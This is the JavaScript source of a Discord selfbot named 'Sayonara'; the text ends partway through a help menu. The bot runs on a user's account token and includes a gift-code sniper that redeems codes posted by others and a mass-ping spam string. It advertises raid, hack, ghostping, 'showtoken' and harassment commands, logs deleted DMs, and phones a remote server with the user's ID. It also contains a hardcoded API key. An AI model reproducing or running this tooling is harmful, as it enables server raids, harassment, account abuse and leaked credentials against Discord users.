
//#region > VARIABLES + MODULES

var language = require("./languages/english.json")
var utility_region = require("./utility/regions.json")
const Discord = require("misakiii-discordjs")
const handler = require('d.js-command-handler');
const client = new Discord.Client()
const disbut = require('discord-buttons')(client);
const axios = require('axios').default;
const { NekoBot } = require("nekobot-api");
const randomPuppy = require('random-puppy');
const request = require("request");
const cheerio = require('cheerio');
const fetch = require('node-fetch');
const Nekow = new NekoBot("");
const snekfetch = require("snekfetch");
let rpcGenerator = require("discordrpcgenerator")
const gradient = require('gradient-string');
const utf8 = require("utf8");
const base64 = require("base-64");
var hookcord = require('hookcord');
var figlet = require('figlet');
let cpuStat = require("cpu-stat");
const os = require("os");
const AmeClient = require('amethyste-api');
const AmeAPI = new AmeClient("61d89e88920400ce965a80567f6c3983135831062b89927b1291ddbb759e69383ac07c09e2c41eaf539eb879376b44837c4036f4b649f51d0e022e64dc21afdc");
const Canvacord = require("canvacord");
const booru = require('booru');
var Scraper = require('images-scraper');
const fs = require("fs");
var moment = require( 'moment' );
const nene = require('nekos.life');
const neko = new nene();
const math = require("math-expression-evaluator");
const weather = require('weather-js');
const DIG = require("discord-image-generation");
require('dotenv').config()
const keepAlive = require("./utility/server");

//>>>> CONFIG.JSON <<<<
var config = require('./config/config.json');
const token = config.TOKEN || process.env.TOKEN
var image = config.IMAGE
var prefix = config.PREFIX
var color = config.COLOR
var sayonaraRPC = config.SAYO_SATE
var MULTISTEAM = config.MULTI_STEAM
var RDM_NICKNAME = config.RANDOM_NICKNAME
var afk_mode = config.AFK_MODE
var report_mode = config.REPORT_MODE
var adblock_mode = config.ADBLOCK_INVITE;
var afkmessage = config.AFK_MSG
var nitro_sniper = config.NITRO_SNIPER


//>>>> BACKUP.JSON <<<<<
const backups = require("./utility/backups-friends.json"); //backup friends
const { send } = require("process");


//Read Commands for pings
var read_ping_msg = ""
var read_ping_user = ""
var read_ping_server = ""
var read_ping_channel = ""

var Project_Name = "𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖"
var Discord_Version = "v9"
var SayoVersion = "6.0";
var premium_user = "false"; //for premium
var typing_mode = "false"; //typing mode fun
var sayostate = "false"; //show sayonara on rich presence
var name = "Sayonara By Misakiii"; //name of selfbot
var webmsg = "𝙎𝙖𝙮 𝙗𝙮𝙚 𝙩𝙤 𝙮𝙤𝙪𝙧 𝙨𝙚𝙧𝙫𝙚𝙧"; //raid msg
var rolename = "𝙈𝙞𝙨𝙖𝙠𝙞𝙞𝙞 ⚠️"; //raid msg
var whitelistID = "0000000000000000000"; //whitelist a friends premium

let interval; //interval for loop
var anti_raid = "off"; //disabled by default
var autoread = "off";
var infotext = "off";
var boldtext = "off";
var autospoiler = "off";
var smalltext = "off";
var yifive = "off";
var pingz = "off";
var animatedletter = "off";
var owofie_text = "off";
var cyantext = "off";
var redtext = "off";
var greentext = "off";
var yellowtext = "off";
var orangetext = "off";
var bluetext = "off";
var betteremojis = "off";

handler(__dirname + '/commands', client, { customPrefix: '/' });

//#endregion



//#region > USEFUL FUNCTION (consolelog, sleep..)

function sleep(milliseconds) 
{
    const date = Date.now();
    let currentDate = null;
    do {
        currentDate = Date.now();
    }
    while (currentDate - date < milliseconds);
}

function consolelog(state, message) 
{
    let now = new Date();
    if (state === "good") { return console.log("\x1b[32m [Sayonara " + now.toLocaleTimeString('en-US') + "] \x1b[37m" + message) }
    if (state === "warning") { return console.log("\x1b[33m [Sayonara " + now.toLocaleTimeString('en-US') + "] \x1b[37m" + message) }
    if (state === "bad") { return console.log("\x1b[31m [Sayonara " + now.toLocaleTimeString('en-US') + "] \x1b[37m" + message) }
    if (state === "information") { return console.log("\x1b[35m [Sayonara " + now.toLocaleTimeString('en-US') + "] \x1b[37m" + message) }
}

//#endregion



//#region > ACCOUNT READY CONNECTED 

console.clear();
client.on("ready", () => 
{
    var emojisatostate = ['🍁', '🌲', '☄️', '⚡️', '❄️', '🔥', '🌪', '🌸', '🌹', '🍣', '🧃', '🌌', '💊', '💉', '🩸', '🔪', '🧸', '🎀', '❤️', '🔰', '🩹'][Math.floor(Math.random() * 20)]
    var random_img = ['sayo1', 'sayo2', 'sayo3', 'sayo4', 'sayo5', 'sayo6', 'sayo7', 'sayo8', 'sayo9', "sayo10", "sayo11", "sayo12", "sayo13", "sayo14", "sayo15", "sayo16", "sayo17", "sayo18"][Math.floor(Math.random() * 18)] 
    var uuid = ()=>([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,a=>(a^Math.random()*16>>a/4).toString(16))

    console.clear()

    var USER_ID = client.user.id;
    axios.get('http://downcraft.xyz/Sayonara/server.php?details=userInDB&username=' + USER_ID).then(response =>
    {
        premium_text = "𝙐𝙨𝙚𝙧";
    
        if (response.data === "Yes") 
        {
            premium_user = "true";
            premium_text = "𝙋𝙧𝙚𝙢𝙞𝙪𝙢";
        } 
        if (response.data === "No")
        {
            premium_user = "false";
            premium_text = "𝙐𝙨𝙚𝙧";
        }

        if (sayonaraRPC == "on")
        {
            rpcGenerator.getRpcImage("841645044486242345", random_img).then(image => 
            {
                let presence = new rpcGenerator.Rpc()
                    .setName(`𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 𝙎𝙚𝙡𝙛𝙗𝙤𝙩`)
                    .setUrl("https://twitch.tv/misakiii_")
                    .setType("STREAMING")
                    .setApplicationId("841645044486242345")
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText(`discord.gg/ZwdVgCkMt2`)
                    .setDetails("𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 𝙎𝙚𝙡𝙛𝙗𝙤𝙩")
                    .setState(`𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 ${premium_text} ` + emojisatostate)
                    .setParty({size: [1, 666], id: uuid()
            })
            client.user.setPresence(presence.toDiscord())}).catch(consolelog("error", "Something is wrong with the ready status"))
        }
    
    }).catch((error) => 
    { 
        console.log("\x1b[41m " + language.ERROR_API_DOWN + " \x1b[40m") 
        process.exit();
    })

    request({uri: `https://discord.com/api/${Discord_Version}/users/@me`, headers: {'Content-Type': 'application/json', Authorization: token}, json: true, method: "GET"}, function(err, response, status) {
        var reponseme = response.body;
        
    request({uri: `https://discord.com/api/${Discord_Version}/users/@me/settings`, headers: {'Content-Type': 'application/json', Authorization: token}, json: true, method: "GET"}, function(err, response, status) {
        var reponsemesettings = response.body;
        

            console.log("\x1b[35m [Sayonara Infos]: \x1b[41m\x1b[37mSayonara is no way responsible for any bans you can get \x1b[40m")
            console.log("\x1b[35m [Sayonara Infos]: \x1b[41m\x1b[37mSayonara dont save any logs/token all is safe enjoy using my selfbot! \x1b[40m")
            console.log(gradient.morning(`  
    ██████  ▄▄▄     ▓██   ██▓ ▒█████   ███▄    █  ▄▄▄       ██▀███   ▄▄▄      
  ▒██    ▒ ▒████▄    ▒██  ██▒▒██▒  ██▒ ██ ▀█   █ ▒████▄    ▓██ ▒ ██▒▒████▄    
  ░ ▓██▄   ▒██  ▀█▄   ▒██ ██░▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄  ▓██ ░▄█ ▒▒██  ▀█▄  
    ▒   ██▒░██▄▄▄▄██  ░ ▐██▓░▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▀▀█▄  ░██▄▄▄▄██ 
  ▒██████▒▒ ▓█   ▓██▒ ░ ██▒▓░░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒░██▓ ▒██▒ ▓█   ▓██▒
  ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░  ██▒▒▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░
  ░ ░▒  ░ ░  ▒   ▒▒ ░▓██ ░▒░   ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░
  ░  ░  ░    ░   ▒   ▒ ▒ ░░  ░ ░ ░ ▒     ░   ░ ░   ░   ▒     ░░   ░   ░   ▒   
        ░        ░  ░░ ░         ░ ░           ░       ░  ░   ░           ░  ░
                     ░ ░                                                      `))
            console.log(`\x1b[31m                       Now Everyone Can Be Happy \x1b[37m`)
            console.log(``)
            console.log(gradient.passion(`                ${language.WELCOME_MSG1}`))
            console.log(gradient.passion(`══════════════════════════════════════════════════════════════`))
            console.log(gradient.passion(`| > Username: ${client.user.tag}`))
            console.log(gradient.passion(`| > ID: ${client.user.id}`))
            console.log(gradient.passion(`| > Server: ${client.guilds.size}`))
            console.log(gradient.passion(`| > Channel: ${client.channels.size}`))
            console.log(gradient.passion(`| > Friends: ${client.user.friends.size}`))
            console.log(gradient.passion(`| > Flags: ${reponseme.public_flags}`))
            console.log(gradient.passion(`| > Theme: ${reponsemesettings.theme}`))
            console.log(gradient.passion(`| > 2FA: ${reponseme.mfa_enabled}`))
            console.log(gradient.passion(`| > Game Activity: ${reponsemesettings.show_current_game}`))
            console.log(gradient.passion(`| > Language: ${reponsemesettings.locale}`))
            console.log(gradient.passion(`| > Number: ${client.user.mobile}`))
            console.log(gradient.passion(`| > Nitro: ${client.user.premium}`))
            console.log(gradient.passion(`| > Premium: ${premium_user}`))
            console.log(gradient.passion(`| > Prefix: ${prefix}`))
            console.log(gradient.passion(`══════════════════════════════════════════════════════════════`))
            console.log(gradient.passion(`              ${language.WELCOME_HOW_TO_USE}`))
            console.log(gradient.passion(``))
        })
    })
});

//#endregion



//#region > REPORT DM + AFK MODE + NITRO SNIPPER + ANTI RAID and mores

//text auto message
client.on("message", message =>
{
    if (betteremojis === "on")
    {
        const normal = config.NORMAL_BETTER_EMOJIS;
        const wide = config.CUSTOM_BETTER_EMOJIS;   
        
        let text = message.content
    
        for (let i = 0; i < normal.length; i++) 
        {
            const char = normal[i];
            text = text.split(char).join(wide[i]);
        }

        return message.edit(text);
    }

    if (bluetext === "on")
    {
        message.edit("[" + message.content + "]", 
        {
            code: "ini"
        })
    }

    if (orangetext === "on")
    {
        message.edit("[" + message.content + "]", 
        {
            code: "css"
        })
    }
    
    if (yellowtext === "on")
    {
        message.edit(message.content, 
        {
            code: "fix"
        })
    }

    if (greentext === "on")
    {
        message.edit("+" + message.content, 
        {
            code: "diff"
        })
    }

    if (redtext === "on")
    {
        message.edit("-" + message.content, 
        {
            code: "diff"
        })
    }

    if (cyantext === "on")
    {
        message.edit(message.content, 
        {
            code: "yaml"
        })
    }

    if (smalltext === "on")
    {
        if (message.author.username === client.user.username)
        {
            const normal = ' 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            const wide =	' ⁰¹²³⁴⁵⁶⁷⁸⁹ᵃᵇᶜᵈᵉᶠᵍʰᶦʲᵏˡᵐⁿᵒᵖǫʳˢᵗᵘᵛʷˣʸᶻᴬᴮᶜᴰᴱᶠᴳᴴᴵᴶᴷᴸᴹᴺᴼᴾǫᴿˢᵀᵁⱽᵂˣʸᶻ';            

            let text = message.content
    
            for (let i = 0; i < normal.length; i++) 
            {
                const char = normal[i];
                text = text.split(char).join(wide[i]);
            }
    
            return message.edit(text);
        }
    }

    if (animatedletter === "on")
    {
        if (message.author.username === client.user.username)
        {
            const normal = [' ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
            const wide = ['    ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<a:1_:843453621840511007>', '<a:2_:843453681819189268>', '<a:3_:843453718611230762>', '<a:4_:843453742590066718>', '<a:5_:843453781366407208>', '<a:6_:843453803985371136>', '<a:7_:843453846696493066>', '<a:8_:843453875070959648>', '<a:9_:843453910042542101>', '<a:10_:843453931673223228>', '<a:11_:843453957275910145>', '<a:12_:843453976871698434>', '<a:13_:843454003500417054>', '<a:14_:843454029438124052>', '<a:15_:843454052498014209>', '<a:16_:843454082315321355>', '<a:17_:843454132228063262>', '<a:18_:843454159542157333>', '<a:19_:843454187361796176>', '<a:20_:843453512599076904>', '<a:21_:843454292441432104>', '<a:22_:843454321516740629>', '<a:23_:843454339968401440>', '<a:24_:843454391851810858>', '<a:25_:843458349268992050>', '<a:26_:843458392059805696>', '<a:1_:843453621840511007>', '<a:2_:843453681819189268>', '<a:3_:843453718611230762>', '<a:4_:843453742590066718>', '<a:5_:843453781366407208>', '<a:6_:843453803985371136>', '<a:7_:843453846696493066>', '<a:8_:843453875070959648>', '<a:9_:843453910042542101>', '<a:10_:843453931673223228>', '<a:11_:843453957275910145>', '<a:12_:843453976871698434>', '<a:13_:843454003500417054>', '<a:14_:843454029438124052>', '<a:15_:843454052498014209>', '<a:16_:843454082315321355>', '<a:17_:843454132228063262>', '<a:18_:843454159542157333>', '<a:19_:843454187361796176>', '<a:20_:843453512599076904>', '<a:21_:843454292441432104>', '<a:22_:843454321516740629>', '<a:23_:843454339968401440>', '<a:24_:843454391851810858>', '<a:25_:843458349268992050>', '<a:26_:843458392059805696>'];     

            let text = message.content
    
            for (let i = 0; i < normal.length; i++) 
            {
                const char = normal[i];
                text = text.split(char).join(wide[i]);
            }
            return message.edit(`‎‎‎‎‎‎‎‎‎‎ ` + text);
        }
    }

    if (yifive === "on")
    {
        if (message.author.username === client.user.username)
        {
            const normal = ' 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            const wide =	' 0123456789ꋫꃃꏸꁕꍟꄘꁍꑛꂑꀭꀗ꒒ꁒꁹꆂꉣꁸ꒓ꌚ꓅ꐇꏝꅐꇓꐟꁴꋫꃃꏸꁕꍟꄘꁍꑛꂑꀭꀗ꒒ꁒꁹꆂꉣꁸ꒓ꌚ꓅ꐇꏝꅐꇓꐟꁴ';

            let text = message.content
    
            for (let i = 0; i < normal.length; i++) 
            {
                const char = normal[i];
                text = text.split(char).join(wide[i]);
            }
    
            return message.edit(text);
        }
    }

    if (owofie_text === "on")
    {
        if (message.author.username === client.user.username)
        {
            const normal = ['r', 'R', 'L', 'l'];
            const wide = ['w', 'W', 'W', 'w'];

            let text = message.content
    
            for (let i = 0; i < normal.length; i++) 
            {
                const char = normal[i];
                text = text.split(char).join(wide[i]);
            }
    
            return message.edit(text);
        }
    }

    if (infotext === "on")
    {
        if (message.author.username === client.user.username)
        {
            message.edit("> " + message.content)
        }
    }

    if (boldtext === "on")
    {
        if (message.author.username === client.user.username)
        {
            message.edit("** " + message.content + " **")
        }
    }

    if (autospoiler === "on")
    {
        if (message.author.username === client.user.username)
        {
            message.edit("|| " + message.content + " ||")
        }
    }

    if (pingz === "on")
    {
        if (message.author.username === client.user.username)
        {
            message.edit(message.content + " ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| @everyone")
        }
    }
});

//auto ready @everyone & @here
client.on("message", message => 
{
    if (autoread === "on")
    {
        if (message.content.includes('@everyone') || message.content.includes('@here'))
        {
            if (message.author.username === client.user.username) return;
            if (message.channel.type === 'dm') return;
            
            var postData = { read_states: [{channel_id: message.channel.id, message_id: message.id}] }; 
            let axiosConfig = { headers: { 'content-type': 'application/json', 'authorization': token } };
            axios.post(`https://discord.com/api/${Discord_Version}/read-states/ack-bulk`, postData, axiosConfig).catch(err => {})

            return consolelog("information", `\x1b[35mAuto Read pings:\x1b[37m the ping has been auto read.`)
        }
    }
})


//REPORT LOGS
client.on("messageDelete", message => 
{
    if (report_mode === "on") 
    {
        if (message.author.username === client.user.username) return;
        if (message.channel.type === 'dm') 
        {
            let lastmess = `${message.content}`;
            let lastuser = `${message.author.tag}`

            const report = new Discord.RichEmbed()
                .setTitle("**「>>「REPORT LOGS」<<」**")
                .addField(`**${lastuser}**`, `${language.REPORT_DELETE}: **${lastmess}**`)
                .setColor(color)
                .setFooter(`🌸 Sayonara | Made By Misakiii 🌸`, image);
            return message.channel.send(report)
        }
    }
});

client.on("messageUpdate", (message, newmsg) => 
{
    if (report_mode === "on")
    {
        if (message.author.username === client.user.username) return;
        if (message.channel.type === 'dm') 
        {
            let lastmsg = `${message.content}`;
            let lastmsgedited = `${newmsg.content}`;
            let lastuser = `${message.author.tag}`;

            const report = new Discord.RichEmbed()
                .setTitle("**「>>「REPORT LOGS」<<」**")
                .addField(`**${lastuser}**`, `${language.REPORT_EDIT}: **${lastmsg}** / **${lastmsgedited}**`)
                .setColor(color)
                .setFooter(`🌸 Sayonara | Made By Misakiii 🌸`, image);
            return message.channel.send(report)
        }
    }
});

//NITRO CODE GRABBER
client.on("message", message => 
{
    if (nitro_sniper === "on") {
        function matchCode(text, callback) {
            let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
            if (codes) {
                callback(codes[0])
                return matchCode(text.slice(codes.index + codes[0].length), callback)
            } else {
                callback(null)
            }
        }

        let codes = []
        matchCode(message.content, (code) => 
        {
            if (!code) return
            if (!codes.includes(code)) codes.push(code)
        })
        if (codes.length == 0) return
        codes.forEach(code => {
            fetch("https://canary.discordapp.com/api/v6/entitlements/gift-codes/" + code.split("/").pop() + "/redeem", {
                method: "post",
                headers: {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US",
                    "Authorization": token,
                    "Connection": "keep-alive",
                    "Content-Length": JSON.stringify({
                        channel_id: message.channel.id
                    }).length,
                    "Content-Type": "application/json",
                    "Host": "canary.discordapp.com",
                    "Referer": `https://canary.discordapp.com/channels/${message.channel.id}/${message.id}`,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                    "X-super-properties": Buffer.from(JSON.stringify({
                        "os": "Windows",
                        "browser": "Firefox",
                        "device": "",
                        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                        "browser_version": "66.0",
                        "os_version": "10",
                        "referrer": "",
                        "referring_domain": "",
                        "referrer_current": "",
                        "referring_domain_current": "",
                        "release_channel": "canary",
                        "client_build_number": 37519,
                        "client_event_source": null
                    }), "utf-8").toString("base64")
                },
                body: JSON.stringify({
                    channel_id: message.channel.id
                })
            }).then(res =>
                {
                if (res.status == 400 || res.status == 404) 
                {
                    console.log("");
                    return console.log(`${language.NITROGRAB_INVALID} ` + code.split("/").pop() + ` in server: ${message.guild.name} in channel: ${message.channel.name}`)
                }
                res.json().then(json => 
                {
                    console.log(json)
                    console.log("")
                    console.log("Nitro code found" + code.split("/").pop() + ` ${language.NITROGRAB_VALID} in server: ${message.guild.name} in channel: ${message.channel.name}`)
                })
            }).catch(console.error)
        })
    }
})



//AFK MESSAGE + ADSBLOCK
client.on("message", message => 
{
    //Detect every @everyone or @here good for ghostping
    if (message.content.includes('@everyone') || message.content.includes('@here'))
    {
        if (message.author.username === client.user.username) return;
        if (message.channel.type === 'dm') return;
        consolelog("information", `${language.GHOSTPING_1}: ` + "\x1b[35m" + message.content + "\x1b[37m" + ` ${language.GHOSTPING_2}: ` + "\x1b[35m" + message.guild.name + "\x1b[37m" + ` ${language.GHOSTPING_3}: ` + "\x1b[35m" + message.channel.name + "\x1b[37m" + ` ${language.GHOSTPING_4}: ` + "\x1b[35m" + message.author.username + "#" + message.author.discriminator + "\x1b[37m")
        read_ping_msg = message.content
        read_ping_user = message.author.username + "#" + message.author.discriminator
        read_ping_server = message.guild.name
        read_ping_channel = message.channel.name
    }

    if (afk_mode === "on") 
    {
        if (message.channel.type === 'dm') 
        {
            if (message.author.username === client.user.username) return;
            message.channel.send(afkmessage)
        }
        
        if (message.isMemberMentioned(client.user))
        {
            if (message.author.username === client.user.username) return;
            message.channel.send("Oh don't ping me, i'm afk i'll talk with you later, when i want :s")
        }
    }

    if (adblock_mode === "on")
    {
        if (message.channel.type === 'dm')
        {
            if (message.content.includes('discord.gg'))
            {
                if (message.author.username === client.user.username) return;
                message.channel.send("**[Sayonara - AdBlock]** > Sorry, but i dont cares about your stupid invite link 🖕")

                let ChannelID = message.channel.id;

                function closeDM() 
                {
                    let axiosConfig = { headers: { 'content-type': 'application/json', 'authorization': token } };
                    axios.delete(`https://discord.com/api/${Discord_Version}/channels/` + ChannelID, axiosConfig)
                }

                setTimeout(closeDM, 3000);

                consolelog("information", `${language.ADBLOCK_NOTIF} ` + message.author.username + "#" + message.author.discriminator)
            }
        }
    }
});




client.on('guildDelete', guild => 
{
    consolelog("information", `${language.GUILD_LEAVE_NOTIF}: ` + "\x1b[35m" + guild.name + "\x1b[37m")
});

client.on('guildCreate', guild => 
{
    consolelog("information", `${language.GUILD_JOIN_NOTIF}: ` + "\x1b[35m" + guild.name + "\x1b[37m")
});

//#endregion



client.on("message", message => 
{
    let cmd = message.content.split(" ")[0] 
    cmd = cmd.slice(prefix.length)
    let args = message.content.split(" ").slice(1)

    function DoNotif(notif) { message.channel.send(notif).then(message => { message.delete(7000)}).catch(console.error); }
    var random_emojis = ['🍁', '🌲', '☄️', '⚡️', '❄️', '🔥', '🌪', '🌸', '🌹', '🍣', '🧃', '🌌', '💊', '💉', '🩸', '🔪', '🧸', '🎀', '❤️', '🔰', '🩹'][Math.floor(Math.random() * 20)]

    if (message.author.username === client.user.username) 
    {
        if (cmd === "help") 
        {
            message.delete()

            const help = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙃𝙚𝙡𝙥」" + random_emojis + " <<」**")
                .setDescription('```     ' + random_emojis + ' 𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 𝙎𝙚𝙡𝙛𝘽𝙤𝙩 ' + random_emojis + '\n           𝗩𝗲𝗿𝘀𝗶𝗼𝗻 ' + SayoVersion + '```')
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "fun ```**", `***${language.FUN_DESC}***`)
                .addField("**```" + prefix + "symbols ```**", `***${language.SYMBOLS_DESC}***`)
                .addField("**```" + prefix + "text ```**", `***${language.TEXT_DESC}***`)
                .addField("**```" + prefix + "raid ```**", `***${language.RAID_DESC}***`)
                .addField("**```" + prefix + "mics ```**", `***${language.MICS_DESC}***`)
                .addField("**```" + prefix + "protection ```**", `***${language.PROTECTION_DESC}***`)
                .addField("**```" + prefix + "hack ```**", `***${language.HACK_DESC}***`)
                .addField("**```" + prefix + "nsfw ```**", `***${language.NSFW_DESC}***`)
                .addField("**```" + prefix + "account ```**", `***${language.ACCOUNT_DESC}***`)
                .addField("**```" + prefix + "premium ```**", `***${language.PREMIUM_DESC}***`)
                .addField("**```" + prefix + "backups ```**", `***${language.BACKUPS_DESC}***`)
                .addField("**```" + prefix + "settings ```**", `***${language.SETTINGS_DESC}***`)
                .addField("**```" + prefix + "credits ```**", `***${language.CREDITS_DESC}***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | .gg/ZwdVgCkMt2 🌸`, image)

            message.channel.send(help)
            consolelog("information", `${language.DEBUG_LOG_HELP_SEND}`)
        }



        //#region > FUN MENU & OPTIONS

        if (cmd === "fun") 
        {
            message.delete()

            const help = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙁𝙪𝙣」" + random_emojis + " <<」**")
                .setColor(color)
                .setThumbnail(client.user.displayAvatarURL)
                .addField("**```" + prefix + "faketyping ```**", `***${language.FAKETYPING_DESC}.***`)
                .addField("**```" + prefix + "annoying ```**", `***${language.ANNOYING_DESC}.***`)
                .addField("**```" + prefix + "insult ```**", `***${language.INSULT_DESC}.***`)
                .addField("**```" + prefix + "say + MENTION + TEXT ```**", `***${language.SAY_DESC}.***`)
                .addField("**```" + prefix + "ghostping ```**", `***${language.GHOSTPING_DESC}.***`)
                .addField("**```" + prefix + "clean ```**", `***${language.CLEAN_DESC}.***`)
                .addField("**```" + prefix + "meme ```**", `***${language.MEME_DESC}.***`)
                .addField("**```" + prefix + "animememe ```**", `***${language.ANIMEMEME_DESC}.***`)
                .addField("**```" + prefix + "stealpfp + MENTION ```**", `***${language.STEALPFP_DESC}.***`)
                .addField("**```" + prefix + "minefont + NUMBER + TEXT ```**", `***${language.MINEFONT_DESC}.***`)
                .addField("**```" + prefix + "phcomment + MENTION + TEXT ```**", `***${language.PHCOMMENT_DESC}.***`)
                .addField("**```" + prefix + "trumptweet + TEXT ```**", `***${language.TRUMPTWEET_DESC}.***`)
                .addField("**```" + prefix + "awooify + MENTION ```**", `***${language.AWOOIFY_DESC}.***`)
                .addField("**```" + prefix + "baguette + MENTION ```**", `***${language.BAGUETTE_DESC}.***`)
                .addField("**```" + prefix + "blurpify + MENTION ```**", `***${language.BLURPLIFY_DESC}.***`)
                .addField("**```" + prefix + "captcha + MENTION + TEXT ```**", `***${language.CAPTCHA_DESC}.***`)
                .addField("**```" + prefix + "changemymind + TEXT ```**", `***${language.CHANGEMYMIND_DESC}.***`)
                .addField("**```" + prefix + "animefacepalm + MENTION ```**", `***${language.ANIMEFACEPALM_DESC}.***`)
                .addField("**```" + prefix + "changenick + TEXT ```**", `***${language.CHANGENICK}.***`)
                .addField("**```" + prefix + "rainbowroles + NAMEROLE ```**", `***${language.RAINBOWROLES_DESC}.***`)
                .addField("**```" + prefix + "loading ```**", `***${language.LOADING_DESC}.***`)
                .addField("**```" + prefix + "testlove + MENTION ```**", `***${language.TESTLOVE_DESC}.***`)
                .addField("**```" + prefix + "nitrogen ```**", `***${language.NITROGEN_DESC}.***`)
                .addField("**```" + prefix + "showtoken + MENTION ```**", `***${language.SHOWTOKEN_DESC}.***`)

            const help2 = new Discord.RichEmbed()
                .setColor(color)
                .addField("**```" + prefix + "editedmsg ```**", `***${language.EDITEDMSG_DESC}.***`)
                .addField("**```" + prefix + "8ball + TEXT ```**", `***${language.EIGHTBALL_DESC}.***`)
                .addField("**```" + prefix + "clyde + TEXT ```**", `***${language.CLYDE_DESC}.***`)
                .addField("**```" + prefix + "deepfry + MENTION ```**", `***${language.DEEPFRY_DESC}.***`)
                .addField("**```" + prefix + "fact + TEXT ```**", `***${language.FACT_DESC}.***`)
                .addField("**```" + prefix + "iphonex + URL ```**", `***${language.IPHONEX_DESC}.***`)
                .addField("**```" + prefix + "jpeg + URL ```**", `***${language.JPEG_DESC}.***`)
                .addField("**```" + prefix + "kannagen + TEXT ```**", `***${language.KANNAGEN_DESC}.***`)
                .addField("**```" + prefix + "lolice + URL ```**", `***${language.LOLICE_DESC}.***`)
                .addField("**```" + prefix + "magik + MENTION ```**", `***${language.MAGIK_DESC}.***`)
                .addField("**```" + prefix + "ship + MENTION + TEXT ```**", `***${language.SHIP_DESC}.***`)
                .addField("**```" + prefix + "threats + MENTION ```**", `***${language.THREATS_DESC}.***`)
                .addField("**```" + prefix + "trap + MENTION ```**", `***${language.TRAP_DESC}.***`)
                .addField("**```" + prefix + "trash + MENTION ```**", `***${language.TRASH_DESC}.***`)
                .addField("**```" + prefix + "tweet + MENTION + TEXT ```**", `***${language.TWEET_DESC}.***`)
                .addField("**```" + prefix + "whowouldwin + MENTION ```**", `***${language.WHOWHOULDWIN_DESC}.***`)
                .addField("**```" + prefix + "sendnude ```**", `***${language.SENDNUDE_DESC}.***`)
                .addField("**```" + prefix + "countdown ```**", `***${language.COUNTDOWN_DESC}.***`)
                .addField("**```" + prefix + "approved + MENTION ```**", `***${language.APPROVED_DESC}.***`)
                .addField("**```" + prefix + "3000years + MENTION ```**", `***${language.YEARS_DESC}.***`)
                .addField("**```" + prefix + "afusion + MENTION + URL ```**", `***${language.AFUSION_DESC}.***`)
                .addField("**```" + prefix + "batslap + MENTION + URL ```**", `***${language.BATSLAP_DESC}.***`)
                .addField("**```" + prefix + "blur + MENTION ```**", `***${language.BLURAVATAR_DESC}.***`)
                .addField("**```" + prefix + "brazzers + MENTION ```**", `***${language.BRAZZER_DESC}.***`)

            const help3 = new Discord.RichEmbed()
                .setColor(color)
                .addField("**```" + prefix + "burn + MENTION ```**", `***${language.BURNAVATAR_DESC}.***`)
                .addField("**```" + prefix + "challenger + MENTION ```**", `***${language.CHALLENGERAVATAR_DESC}.***`)
                .addField("**```" + prefix + "contrast + MENTION ```**", `***${language.CONTAST_DESC}.***`)
